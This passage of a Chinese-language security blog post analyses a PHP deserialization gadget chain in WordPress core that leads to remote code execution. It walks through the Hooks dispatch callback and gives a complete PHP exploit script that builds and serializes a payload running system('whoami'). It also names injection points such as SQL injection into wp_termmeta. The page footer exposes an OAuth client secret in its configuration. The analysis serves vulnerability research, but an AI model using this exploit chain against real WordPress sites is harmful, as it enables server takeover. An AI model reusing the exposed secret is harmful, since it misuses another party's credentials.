<span class="string">&#x27;string&#x27;</span>, <span class="title function_ invoke__">gettype</span>(<span class="variable">$type</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="title class_">InvalidArgument</span>::<span class="title function_ invoke__">create</span>(<span class="number">5</span>, <span class="string">&#x27;$options&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="title function_ invoke__">gettype</span>(<span class="variable">$options</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;type&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$options</span>[<span class="string">&#x27;type&#x27;</span>] = <span class="variable">$type</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$options</span> = <span class="title function_ invoke__">array_merge</span>(<span class="built_in">self</span>::<span class="title function_ invoke__">get_default_options</span>(), <span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">self</span>::<span class="title function_ invoke__">set_defaults</span>(<span class="variable">$url</span>, <span class="variable">$headers</span>, <span class="variable">$data</span>, <span class="variable">$type</span>, <span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用请求钩子（hooks）触发requests.before_parse事件,允许用户在解析响应之前对响应进行自定义操作</span></span><br><span class="line">    <span class="comment">// 关键点</span></span><br><span class="line">    <span class="variable">$options</span>[<span class="string">&#x27;hooks&#x27;</span>]-&gt;<span class="title function_ invoke__">dispatch</span>(<span class="string">&#x27;requests.before_request&#x27;</span>, [&amp;<span class="variable">$url</span>, &amp;<span class="variable">$headers</span>, &amp;<span class="variable">$data</span>, &amp;<span class="variable">$type</span>, &amp;<span class="variable">$options</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$options变量可控，需要寻找一个包含dispatch方法的类，选择Hooks实例</p>
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207123710.png"></p>
+<p><strong>第九步</strong>：</p>
+<p>进入wp-includes&#x2F;Requests&#x2F;src&#x2F;Hooks.php的dispatch方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span>(<span class="params"><span class="variable">$hook</span>, <span class="variable">$parameters</span> = []</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$hook</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="title class_">InvalidArgument</span>::<span class="title function_ invoke__">create</span>(<span class="number">1</span>, <span class="string">&#x27;$hook&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="title function_ invoke__">gettype</span>(<span class="variable">$hook</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check strictly against array, as Array* objects don&#x27;t work in combination with `call_user_func_array()`.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$parameters</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="title class_">InvalidArgument</span>::<span class="title function_ invoke__">create</span>(<span class="number">2</span>, <span class="string">&#x27;$parameters&#x27;</span>, <span class="string">&#x27;array&#x27;</span>, <span class="title function_ invoke__">gettype</span>(<span class="variable">$parameters</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;hooks[<span class="variable">$hook</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$parameters</span>)) &#123;</span><br><span class="line">        <span class="comment">// Strip potential keys from the array to prevent them being interpreted as parameter names in PHP 8.0.</span></span><br><span class="line">        <span class="variable">$parameters</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$parameters</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">ksort</span>(<span class="variable">$this</span>-&gt;hooks[<span class="variable">$hook</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关键部分</span></span><br><span class="line">    <span class="comment">// 通过两层循环，遍历钩子列表中的每个回调函数。外层循环按照优先级顺序遍历，内层循环遍历每个优先级下的回调函数。</span></span><br><span class="line">    <span class="comment">// 在内层循环中，通过调用 $callback(...$parameters) 执行回调函数。使用可变长度参数语法将 $parameters 数组中的元素作为参数传递给回调函数。</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;hooks[<span class="variable">$hook</span>] <span class="keyword">as</span> <span class="variable">$priority</span> =&gt; <span class="variable">$hooked</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$hooked</span> <span class="keyword">as</span> <span class="variable">$callback</span>) &#123;</span><br><span class="line">            <span class="variable">$callback</span>(...<span class="variable">$parameters</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该方法的作用是触发指定钩子事件，并按照优先级顺序执行与之关联的回调函数。它通过遍历钩子列表中的回调函数，并将参数传递给每个回调函数来实现这一目的。这种机制允许开发者在特定的时机插入自定义逻辑，扩展和定制程序的功能。</p>
+<p>这里的hooks和$parameters都可控，从而控制$callback回调函数和参数</p>
+<p>第一次调用dispatch方法，即Requests.php中的request方法处</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$options</span>[<span class="string">&#x27;hooks&#x27;</span>]-&gt;<span class="title function_ invoke__">dispatch</span>(<span class="string">&#x27;requests.before_request&#x27;</span>, [&amp;<span class="variable">$url</span>, &amp;<span class="variable">$headers</span>, &amp;<span class="variable">$data</span>, &amp;<span class="variable">$type</span>, &amp;<span class="variable">$options</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>所构成的回调函数$this-&gt;hooks[“requests.before_request”][0][0]([&amp;$url, &amp;$headers, &amp;$data, &amp;$type, &amp;$options])</p>
+<p>而$this-&gt;hooks[“requests.before_request”][0][0]为一个数组，第一个元素为Hooks实例，第二个元素为方法字符串”dispatch”，因此又回调至Hooks的dispatch方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207175419.png"></p>
+<p>第二次调用dispatch方法，通过回调，由于dispatch方法只使用了两个参数，因此回调中的后三个参数不会使用，即$data、$type和$option</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">dispatch</span>(&amp;<span class="variable">$url</span>, &amp;<span class="variable">$headers</span>)</span><br></pre></td></tr></table></figure>
+
+<p>此时的$this对应的是新Hooks实例，$hook参数对应的是$url，而$this-&gt;hooks数组中存在以$url为键的值，是一个数组，里面第一个元素为system字符串</p>
+<p>而$parameters对应的是$header，是一个数组，里面存放whoami字符串，从而构成回调方法：system([“whoami”])</p>
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207214140.png"></p>
+<p>最后成功RCE</p>
+<h1 id="尝试编写EXP"><a href="#尝试编写EXP" class="headerlink" title="尝试编写EXP"></a>尝试编写EXP</h1><p>根据实现的整体流程，尝试动手编写EXP</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">WpOrg</span>\<span class="title class_">Requests</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Session</span> &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">url</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$headers</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$options</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$headers</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;url = <span class="variable">$url</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;headers = <span class="variable">$headers</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options = <span class="variable">$options</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hooks</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$hooks</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$hooks</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hooks = <span class="variable">$hooks</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">WpOrg</span>\<span class="title class_">Requests</span>\<span class="title class_">Hooks</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">WpOrg</span>\<span class="title">Requests</span>\<span class="title">Session</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WP_Theme</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$headers</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$headers</span>, <span class="variable">$parent</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;headers = <span class="variable">$headers</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="variable">$parent</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WP_Block_List</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$blocks</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$registry</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$blocks</span>, <span class="variable">$registry</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;blocks = <span class="variable">$blocks</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;registry = <span class="variable">$registry</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WP_Block_Type_Registry</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$registered_block_types</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$registered_block_types</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;registered_block_types = <span class="variable">$registered_block_types</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$hooks</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;requests.before_request&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="comment">// $hooked</span></span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">            <span class="comment">// $callback</span></span><br><span class="line">                <span class="keyword">array</span> (</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Hooks</span>(<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&quot;http://p:0/Name&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">                            <span class="keyword">array</span>(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">                        )</span><br><span class="line">                        )</span><br><span class="line">                    ),</span><br><span class="line">                    <span class="string">&quot;dispatch&quot;</span></span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 需要设置hooks属性</span></span><br><span class="line">    <span class="variable">$hook</span> = <span class="keyword">new</span> <span class="title class_">Hooks</span>(<span class="variable">$hooks</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// headers对应的最后执行的命令数组</span></span><br><span class="line">    <span class="comment">// options中有一个hooks键，需要设置成Hooks实例</span></span><br><span class="line">    <span class="variable">$parent</span> = <span class="keyword">new</span> <span class="title class_">Session</span>(<span class="string">&quot;http://p:0&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;whoami&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;hooks&quot;</span> =&gt; <span class="variable">$hook</span>) );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 需要设置parent属性为Session实例</span></span><br><span class="line">    <span class="variable">$registered_block_types</span> = <span class="keyword">new</span> <span class="title class_">WP_Theme</span>(<span class="literal">null</span>, <span class="variable">$parent</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在WP_Theme中根据offsetGet方法来设置</span></span><br><span class="line">    <span class="variable">$block</span> = [<span class="string">&quot;blockName&quot;</span> =&gt; <span class="string">&quot;Parent Theme&quot;</span>];</span><br><span class="line">    <span class="variable">$blocks</span> = [<span class="string">&quot;Name&quot;</span> =&gt; <span class="variable">$block</span>];</span><br><span class="line">    <span class="comment">// 需要设置registered_block_types属性，同样为继承ArrayAccess接口的实例，即WP_Theme</span></span><br><span class="line">    <span class="variable">$registry</span> = <span class="keyword">new</span> <span class="title class_">WP_Block_Type_Registry</span>(<span class="variable">$registered_block_types</span>);</span><br><span class="line">    <span class="comment">// 需要设置blocks属性，含有“Name”键，为数组</span></span><br><span class="line">    <span class="comment">// 需要设置registry属性为WP_Block_Type_Registry对象</span></span><br><span class="line">    <span class="variable">$headers</span> = <span class="keyword">new</span> <span class="title class_">WP_Block_List</span>(<span class="variable">$blocks</span>, <span class="variable">$registry</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// WP_Theme中的get方法，需要设置$header属性为继承ArrayAccess接口的实例，即WP_Block_List</span></span><br><span class="line">    <span class="comment">// 触发__toString方法的对象</span></span><br><span class="line">    <span class="variable">$theme</span> = <span class="keyword">new</span> <span class="title class_">WP_Theme</span>(<span class="variable">$headers</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$theme</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>生成的payload能够成功RCE</p>
+<h1 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h1><p>首先需要找到反序列化点，在wordpress中存在该方法maybe_unserialize会对传入的数据进行反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">maybe_unserialize</span>(<span class="params"> <span class="variable">$data</span> </span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ( <span class="title function_ invoke__">is_serialized</span>( <span class="variable">$data</span> ) ) &#123; <span class="comment">// Don&#x27;t attempt to unserialize data that wasn&#x27;t serialized going in.</span></span><br><span class="line">		<span class="keyword">return</span> @<span class="title function_ invoke__">unserialize</span>( <span class="title function_ invoke__">trim</span>( <span class="variable">$data</span> ) );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而调用该方法的在整个项目中存在20项</p>
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207235734.png"></p>
+<p><strong>payload</strong>注入点：</p>
+<p>一般而言通过SQL注入漏洞往数据库中写入恶意的payload能够到达这一效果，在wpscan的报告中提到，存在SQL注入漏洞会在 wp_termmeta 表中插入新行，插入的元数据在检索时会经过 maybe_unserialize，从而造成RCE</p>
+<p>其实管理员用户名处、站点名等设置成恶意payload都可以导致RCE</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://wpscan.com/blog/finding-a-rce-gadget-chain-in-wordpress-core/">Finding A RCE Gadget Chain In WordPress Core | WPScan</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">ambionics&#x2F;phpggc: PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically. (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://fenrisk.com/publications/blogpost/2023/11/22/gadgets-chain-in-wordpress/">Gadgets chain in Wordpress (fenrisk.com)</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.bmth666.cn/2023/11/03/WordPress%EF%BC%9C6-3-2-toString-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/">WordPress＜6.3.2 __toString 反序列化链分析 | Bmth’s blog (bmth666.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://exp10it.io/2023/10/wordpress-core-rce-gadget-%E5%88%86%E6%9E%90/">WordPress Core RCE Gadget 分析 - X1r0z Blog (exp10it.io)</a></p>
+<p>[WordPress &lt; 3.6.1 PHP 对象注入漏洞 - 五道口杀气 (wooyun.js.org)](<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/WordPress">https://wooyun.js.org/drops/WordPress</a> . 3.6.1 PHP 对象注入漏洞.html)</p>
+<blockquote>
+<p>注：本文首发于<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13616">https://xz.aliyun.com/t/13616</a></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer"><div>
+  <div class="end-slogan" style="text-align:center;font-size:22px;letter-spacing:10px;user-seclect:none;color:#bbb">----------- 本文结束啦<i class="fa fa-star"></i>感谢您阅读-----------</div>		
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>DiliLearngent
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://dililearngent.github.io/2024/02/07/WordPress-RCE1/" title="一条有趣的WordPress反序列化链分析">https://dililearngent.github.io/2024/02/07/WordPress-RCE1/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/PHP%E5%AE%89%E5%85%A8/" rel="tag"># PHP安全</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag"># 漏洞分析</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/11/01/Hessian/" rel="prev" title="Java安全之Hessian反序列化链详解">
+                  <i class="fa fa-chevron-left"></i> Java安全之Hessian反序列化链详解
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2019 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">DiliLearngent</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">101k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">6:08</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div><!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("05/20/2020 13:14:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+
+    </div>
+  </footer>
+
+  
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"DiliLearngent","repo":"dililearngent.github.io","client_id":"e12e8d95c8711de863a8","client_secret":"22368c9ebad498682ec51031519e47b96c45ee7c","admin_user":"DiliLearngent","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"a70632dc28cd26c3cb121f227e658445"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+<div class="moon-menu">
+  <div class="moon-menu-items">
+    
+    <div id="moon-menu-item-back2bottom" class="moon-menu-item">
+      <i class='fas fa-chevron-down'></i>    </div>
+    
+    <div id="moon-menu-item-back2top" class="moon-menu-item">
+      <i class='fas fa-chevron-up'></i>    </div>
+    
+  </div>
+  <div class="moon-menu-button">
+    <svg class="moon-menu-bg">
+      <circle class="moon-menu-cricle" cx="50%" cy="50%" r="44%"></circle>
+      <circle class="moon-menu-border" cx="50%" cy="50%" r="48%"></circle>
+    </svg>
+    <div class="moon-menu-content">
+      <div class="moon-menu-icon"><i class='fas fa-ellipsis-v'></i></div>
+      <div class="moon-menu-text"></div>
+    </div>
+  </div>
+</div><script src="/js/injector.js"></script>
+</body>
+</html>
